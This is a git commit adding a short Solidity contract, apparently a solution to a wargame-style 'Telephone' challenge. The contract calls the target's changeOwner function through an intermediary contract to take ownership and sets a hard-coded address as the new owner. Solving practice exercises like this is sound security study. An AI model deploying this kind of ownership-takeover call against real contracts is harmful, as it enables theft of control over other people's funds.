0db1e836d9b76f8d035a8103aaf4d7870ca901db
박시우 <siw0218@naver.com>
2025-11-04 17:50:33 +0900

    Update telephone.sol

--- telephone.sol
+++ telephone.sol
@@ -1,1 +1,16 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+interface Telephone {
+    function changeOwner(address _owner) external;
+}
+
+contract Attack {
+    Telephone telephone;
+    constructor(address addr) {
+        telephone=Telephone(addr);
+    }
+    function attack() public {
+        telephone.changeOwner(0x285ac9F8881D867556fCf6C16F26e3629F86C971);
+    }
+}
